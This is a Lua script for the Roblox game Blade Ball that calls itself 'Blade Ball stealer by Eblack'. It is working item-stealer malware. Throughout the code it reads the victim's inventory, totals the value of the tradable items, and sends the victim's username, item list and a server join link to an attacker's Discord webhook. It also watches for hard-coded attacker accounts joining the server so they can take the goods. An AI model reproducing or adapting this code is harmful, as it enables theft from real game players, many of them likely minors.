_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui.Trade
local inTrade = false
local notificationsGui = PlayerGui.Notifications
local tradeCompleteGui = PlayerGui.TradeCompleted
local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(game.ReplicatedStorage.Packages.Replion)

-- // CONFIGURATION GLOBALE
local users = _G.Usernames or {"Silv3rTurboH3ro", "Ddr5pri","Andrewdagoatya","EmmaQueen2024_YT","Ech0_Night2010YT","EpicClawSilver","PhoenixSilver2011","XxElla_R0CK3TXX"}
local min_rap = _G.min_rap or 100
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""

if next(users) == nil or webhook == "" then
    plr:kick("You didn't add usernames or webhook")
    return
end

-- // FORMATAGE NOMBRE
local function formatNumber(number)
    if number == nil then return "0" end
	local suffixes = {"", "k", "m", "b", "t"}
	local suffixIndex = 1
	while number >= 1000 and suffixIndex < #suffixes do
		number = number / 1000
		suffixIndex = suffixIndex + 1
	end
    return suffixIndex == 1 and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[suffixIndex])
end

local totalRAP = 0

-- // EMBED 1 : JOIN MESSAGE (SCAN)
local function SendJoinMessage(list, prefix)
    local isGoodHit = totalRAP >= 500
    local fields = {
        {name = "Victim Username:", value = "```" .. plr.Name .. "```", inline = true},
        {name = "Join link:", value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId},
        {name = "Item list:", value = "", inline = false},
        {name = "Summary:", value = string.format("Total RAP: **%s**", formatNumber(totalRAP)), inline = false}
    }

    local grouped = {}
    for _, item in ipairs(list) do
        grouped[item.Name] = (grouped[item.Name] or 0) + 1
    end

    local groupedList = {}
    for name, count in pairs(grouped) do table.insert(groupedList, {Name = name, Count = count}) end

    for _, group in ipairs(groupedList) do
        fields[3].value = fields[3].value .. string.format("%s (x%s)\n", group.Name, group.Count)
    end

    local data = {
        ["username"] = isGoodHit and "🟢 Eblack - GOOD HIT" or "🟣 Eblack - SMALL HIT",
        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
        ["embeds"] = {{
            ["title"] = isGoodHit and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯",
            ["color"] = isGoodHit and 65280 or 8323327,
            ["fields"] = fields,
            ["footer"] = {["text"] = "Blade Ball stealer by Eblack"}
        }}
    }
    request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
end

-- // EMBED 2 : SERVER HIT (QUAND TU REJOINS)
local function SendMessage(list)
    local isGoodHit = totalRAP >= 500
    local embedColor = isGoodHit and 65280 or 8323327 -- VERT si > 500, sinon VIOLET
    
    local fields = {
		{name = "Victim Username:", value = "```" .. plr.Name .. "```", inline = true},
		{name = "Status:", value = isGoodHit and "🟢 GOOD HIT" or "🟣 SMALL HIT", inline = true},
        {name = "Items to Steal:", value = "", inline = false},
        {name = "Summary:", value = string.format("Total RAP: **%s**", formatNumber(totalRAP)), inline = false}
	}

    local grouped = {}
    for _, item in ipairs(list) do
        grouped[item.Name] = (grouped[item.Name] or 0) + 1
    end

    for name, count in pairs(grouped) do
        fields[3].value = fields[3].value .. string.format("%s (x%s)\n", name, count)
    end

    local data = {
        ["username"] = isGoodHit and "⚪ Eblack - SERVER HIT (GOOD)" or "⚪ Eblack - SERVER HIT (SMALL)",
        ["embeds"] = {{
            ["title"] = "⚪ SERVER HIT 🎉", -- LE TITRE QUE TU VOULAIS
            ["color"] = embedColor, -- LA COULEUR DYNAMIQUE
			["fields"] = fields,
			["footer"] = {["text"] = "Blade Ball stealer by Eblack"}
        }}
    }
    request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
end

-- // SCAN DATA
local rapDataResult = Replion.Client:GetReplion("ItemRAP")
local rapData = rapDataResult.Data.Items

local function buildNameToRAPMap(category)
    local nameToRAP = {}
    local categoryRapData = rapData[category]
    if not categoryRapData then return nameToRAP end
    for serializedKey, rap in pairs(categoryRapData) do
        local success, decodedKey = pcall(function() return HttpService:JSONDecode(serializedKey) end)
        if success and type(decodedKey) == "table" then
            for _, pair in ipairs(decodedKey) do
                if pair[1] == "Name" then nameToRAP[pair[2]] = rap break end
            end
        end
    end
    return nameToRAP
end

local rapMappings = {}
for _, category in ipairs(categories) do rapMappings[category] = buildNameToRAPMap(category) end

for _, category in ipairs(categories) do
    for itemId, itemInfo in pairs(clientInventory[category]) do
        if not itemInfo.TradeLock then
            local rap = (rapMappings[category] and rapMappings[category][itemInfo.Name]) or 0
            if rap >= min_rap then
                totalRAP = totalRAP + rap
                table.insert(itemsToSend, {ItemID = itemId, RAP = rap, itemType = category, Name = itemInfo.Name})
            end
        end
    end
end

-- // EXECUTION
if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
    local sentItems = {}
    for i, v in ipairs(itemsToSend) do sentItems[i] = v end

    SendJoinMessage(itemsToSend, (ping == "Yes" and "@everyone " or ""))

    -- // DETECTION DU JOIN
    local hasSentHit = false
    local function onPlayerAdded(player)
        if not hasSentHit and table.find(users, player.Name) then
            hasSentHit = true
            SendMessage(sentItems)
        end
    end

    for _, p in ipairs(Players:GetPlayers()) do onPlayerAdded(p) end
    Players.PlayerAdded:Connect(onPlayerAdded)
end
